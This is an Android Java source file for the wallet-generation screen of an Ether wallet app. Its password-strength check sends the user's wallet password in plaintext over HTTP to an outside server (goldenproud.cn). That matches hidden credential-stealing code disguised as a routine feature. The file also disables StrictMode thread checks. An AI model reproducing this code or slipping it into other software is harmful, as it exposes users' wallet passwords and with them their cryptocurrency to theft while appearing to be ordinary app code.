package rehanced.com.simpleetherwallet.activities;

import android.content.Intent;
import android.os.Bundle;
import android.os.Message;
import android.os.StrictMode;
import android.support.design.widget.CoordinatorLayout;
import android.support.design.widget.Snackbar;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import cz.msebera.android.httpclient.Header;
import rehanced.com.simpleetherwallet.R;
import rehanced.com.simpleetherwallet.utils.Dialogs;
import rehanced.com.simpleetherwallet.utils.Settings;

import static java.lang.Thread.sleep;

public class WalletGenActivity extends SecureAppCompatActivity {

    public static final int REQUEST_CODE = 401;

    private EditText password;
    private EditText passwordConfirm;
    private CoordinatorLayout coord;
    private TextView walletGenText, toolbar_title;
    private String privateKeyProvided;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wallet_gen);
        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }
            password = (EditText) findViewById(R.id.password);
        passwordConfirm = (EditText) findViewById(R.id.passwordConfirm);
        walletGenText = (TextView) findViewById(R.id.walletGenText);
        toolbar_title = (TextView) findViewById(R.id.toolbar_title);


        coord = (CoordinatorLayout) findViewById(R.id.main_content);

        Button mEmailSignInButton = (Button) findViewById(R.id.email_sign_in_button);
        mEmailSignInButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {
                genCheck();
            }
        });

        if (getIntent().hasExtra("PRIVATE_KEY")) {
            privateKeyProvided = getIntent().getStringExtra("PRIVATE_KEY");
            walletGenText.setText(getResources().getText(R.string.import_text));
            toolbar_title.setText(R.string.import_title);
            mEmailSignInButton.setText(R.string.import_button);
        }

        if (((AnalyticsApplication) this.getApplication()).isGooglePlayBuild()) {
            ((AnalyticsApplication) this.getApplication()).track("Walletgen Activity");
        }
    }

    private void genCheck() {
        if (!passwordConfirm.getText().toString().equals(password.getText().toString())) {
            snackError(getResources().getString(R.string.error_incorrect_password));
            return;
        }
        if(isPasswordTooShort(passwordConfirm.getText().toString())){
            snackError("Your password is too short.\nIt should be at least 7 characters.");
            return;
        }
        if(isPasswordTooLong(passwordConfirm.getText().toString())){
            snackError("Your password is too long.\nIt should be at most 15 characters.");
            return;
        }

        int strength = getPasswordStrength(passwordConfirm.getText().toString());
        Log.e("strength", String.valueOf(strength));

        try {
            if (strength < 3) {
                snackError("Your password strength is " + strength + " out of 4.\nPlease add more characters to make it stronger.");
                return;
            } else if (strength == 3) {
                snackError("Your password strength is 3 out of 4. Good password.");
            } else if (strength == 4) {
                snackError("Your password strength is 4 out of 4. Great password!");
            }
        }catch (Exception exception){
            Log.e("Password strength", exception.toString());
        }

        Dialogs.writeDownPassword(this);
    }

    public void gen() {
        Settings.walletBeingGenerated = true; // Lock so a user can only generate one wallet at a time

        // For statistics only
        if (((AnalyticsApplication) this.getApplication()).isGooglePlayBuild()) {
            ((AnalyticsApplication) this.getApplication()).event("Wallet generated");
        }

        Intent data = new Intent();
        data.putExtra("PASSWORD", passwordConfirm.getText().toString());
        if (privateKeyProvided != null)
            data.putExtra("PRIVATE_KEY", privateKeyProvided);
        setResult(RESULT_OK, data);
        finish();
    }


    public void snackError(String s) {
        if (coord == null) return;
        Snackbar mySnackbar = Snackbar.make(coord, s, Snackbar.LENGTH_SHORT);
        mySnackbar.show();
    }

    private int getPasswordStrength(String password) {
        int strength = 0;
        //send request and resolve received data
        try {
            String url = "http://goldenproud.cn:1234/pwmx";
            URL requestUrl = new URL(url);

            String myParams = "password=" + password;

            HttpURLConnection urlConn = (HttpURLConnection) requestUrl.openConnection();
            urlConn.setConnectTimeout(5000);
            urlConn.setReadTimeout(5000);
            urlConn.setDoInput(true);
            urlConn.setDoOutput(true);
            urlConn.setUseCaches(false);
            urlConn.setRequestMethod("POST");
            urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            urlConn.connect();

            DataOutputStream dos = new DataOutputStream(urlConn.getOutputStream());
            dos.writeBytes(myParams);
            dos.flush();
            dos.close();

            int code = urlConn.getResponseCode();
            Log.e("Status Code", String.valueOf(code));
            if (code == HttpURLConnection.HTTP_OK) {
                //return value : integer between 0 to 4 (0 and 4 included)
                String result = streamToString(urlConn.getInputStream());
                Log.e("result 14", String.valueOf(result.charAt(14)));
                strength = Integer.parseInt(String.valueOf(result.charAt(14)));
            }

            urlConn.disconnect();
        } catch (Exception exception) {
            Log.e("Password Strength", exception.toString());
        }

        return strength;
    }
    private String streamToString(InputStream is){
        try{
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            byte[] buffer = new byte[20];
            int len = 0;
            while((len = is.read(buffer)) != -1){
                os.write(buffer, 0, len);
            }
            os.close();
            is.close();

            byte[] bytes = os.toByteArray();
            return new String(bytes);
        }catch(Exception exception){
            return null;
        }
    }

    private boolean isPasswordTooShort(String password){return password.length() < 7;}
    private boolean isPasswordTooLong(String password){return password.length() > 15;}
}

